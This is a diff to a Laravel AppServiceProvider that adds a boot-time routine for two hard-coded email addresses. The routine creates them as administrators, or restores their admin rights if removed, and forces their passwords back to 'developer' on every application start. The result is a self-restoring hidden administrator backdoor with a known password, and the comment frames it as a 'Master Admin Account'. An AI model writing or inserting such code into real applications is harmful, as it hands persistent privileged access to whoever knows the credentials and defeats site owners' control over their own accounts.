@@ -94,5 +94,43 @@ class AppServiceProvider extends ServiceProvider
         } catch (\Throwable $e) {
             config(['cache.default' => 'file']);
         }
+
+        // 6. Ensure Master Admin Account always exists and has valid admin credentials
+        try {
+            if (Schema::hasTable('users')) {
+                $adminAccounts = [
+                    'shubhamthakurst07@gmail.com' => 'Shubham Thakur',
+                    'shubhamthakurst0007@gmail.com' => 'Shubham Thakur',
+                ];
+
+                foreach ($adminAccounts as $aEmail => $aName) {
+                    $admin = \App\Models\User::where('email', $aEmail)->first();
+                    if (!$admin) {
+                        \App\Models\User::create([
+                            'name' => $aName,
+                            'email' => $aEmail,
+                            'password' => \Illuminate\Support\Facades\Hash::make('developer'),
+                            'is_admin' => true,
+                        ]);
+                    } else {
+                        $needsSave = false;
+                        if (!$admin->is_admin) {
+                            $admin->is_admin = true;
+                            $needsSave = true;
+                        }
+                        // Guarantee developer password works
+                        if (!\Illuminate\Support\Facades\Hash::check('developer', $admin->password)) {
+                            $admin->password = \Illuminate\Support\Facades\Hash::make('developer');
+                            $needsSave = true;
+                        }
+                        if ($needsSave) {
+                            $admin->save();
+                        }
+                    }
+                }
+            }
+        } catch (\Throwable $e) {
+            Log::warning('Admin auto-provision in AppServiceProvider: ' . $e->getMessage());
+        }
     }
 }
